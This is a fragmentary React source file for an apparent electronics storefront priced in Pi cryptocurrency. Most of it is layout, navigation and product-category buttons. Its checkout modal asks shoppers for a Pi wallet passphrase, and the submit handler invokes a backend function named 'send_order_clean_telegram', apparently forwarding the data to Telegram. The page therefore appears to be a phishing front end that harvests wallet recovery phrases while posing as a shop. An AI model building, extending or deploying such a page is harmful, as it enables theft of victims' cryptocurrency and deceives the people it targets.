...
const Index = () => {
  ...
  const handleSubmitOrder = async () => {
    ...
    try {
      const { data, error } = await supabase.functions.invoke('send_order_clean_telegram_2025_11_09_17_30', {
        body: {
  ...
  return (
    <div className="min-h-screen bg-white">
        ...
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-20">
            ...
            <nav className="hidden lg:flex items-center space-x-8">
              ...
              <button onClick={() => scrollToSection('products')} className="nav-link text-gray-700 hover:text-primary">Products</button>
              <button onClick={() => scrollToSection('features')} className="nav-link text-gray-700 hover:text-primary">Features</button>
              <button onClick={() => scrollToSection('testimonials')} className="nav-link text-gray-700 hover:text-primary">Reviews</button>
              <button onClick={() => scrollToSection('contact')} className="nav-link text-gray-700 hover:text-primary">Support</button>
            </nav>
          ...
          <div className="lg:hidden bg-white/95 backdrop-blur-md border-t border-gray-200 shadow-lg">
            <div className="px-6 py-8 space-y-6">
              <button 
                ...
                className="block text-gray-700 hover:text-primary font-medium w-full text-left py-3 px-4 rounded-lg hover:bg-purple-50 transition-colors"
              >
                Home
              </button>
              <button 
            ...
            <div className="space-y-8">
              ...
              <div className="flex flex-col sm:flex-row gap-4 w-full">
                ...
                <Button 
                  ...
                  size="lg" 
                  onClick={() => scrollToSection('features')}
                  className="px-8 py-4 rounded-full text-lg font-semibold border-2 w-full sm:w-auto"
                >
                  Learn More
                </Button>
              </div>
        ...
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          ...
          <div className="flex flex-wrap justify-center gap-4 mb-12">
            ...
            <Button 
              ...
              variant={selectedCategory === 'smartphone' ? 'default' : 'outline'}
              className="rounded-full px-6 py-2"
            >
            ...
            <Button 
              ...
              variant={selectedCategory === 'smartwatch' ? 'default' : 'outline'}
              className="rounded-full px-6 py-2"
            >
            ...
            <Button 
              ...
              variant={selectedCategory === 'laptop' ? 'default' : 'outline'}
              className="rounded-full px-6 py-2"
            >
        ...
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          ...
          <div className="grid lg:grid-cols-3 gap-8">
            ...
            <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
              ...
              <Button className="btn-primary">Security Info</Button>
            </div>
          </div>
        </div>
      </section>
      ...
      <Dialog open={showPassphraseModal} onOpenChange={setShowPassphraseModal}>
        <DialogContent 
          className="max-w-2xl modal-backdrop mx-4 sm:mx-auto max-h-[90vh] overflow-y-auto"
          style={{
        ...
        >
          <DialogHeader className="hero-gradient text-white p-4 sm:p-6 -m-6 mb-6 rounded-t-2xl">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-3">
          ...
          <div className="space-y-4 sm:space-y-6 relative z-10 p-1">
            <div className="text-center">
              <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">Secure Checkout</h2>
              ...
              <div className="bg-gradient-to-r from-purple-50 to-blue-50 p-4 sm:p-6 rounded-xl border border-purple-100">
                <div className="flex items-center space-x-4">
                  ...
                  <div className="flex-1">
                    <h3 className="font-bold text-gray-900 text-lg sm:text-xl mb-1">{selectedProduct.name}</h3>
                    <div className="flex items-center space-x-2 mb-2">
                      <span className="text-2xl sm:text-3xl font-bold pi-gold-text">{selectedProduct.price}π</span>
                      <span className="text-gray-500 line-through text-sm">{selectedProduct.original_price}π</span>
                    </div>
            ...
            {selectedProduct && (
              <div className="bg-white p-4 sm:p-6 rounded-xl shadow-sm border border-gray-100">
                ...
                {selectedProduct.available_storage && selectedProduct.available_storage.length > 0 && (
                  <div>
                    <Label className="text-gray-700 font-medium mb-3 block">
                    ...
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                      {selectedProduct.available_storage.map((storage) => (
                        <button
                          key={storage}
            ...
            <div className="bg-white p-4 sm:p-6 rounded-xl shadow-sm border border-gray-100">
              <h3 className="text-lg font-semibold text-gray-900 mb-4">Pi Wallet Authentication</h3>
              ...
              />
              {passphraseError && (
                <p className="text-red-500 text-sm mt-2">{passphraseError}</p>
              )}
            ...
            <Button 
              ...
              className="w-full btn-primary py-4 sm:py-6 text-lg sm:text-xl font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
            >
              {isSubmitting ? (
                <>
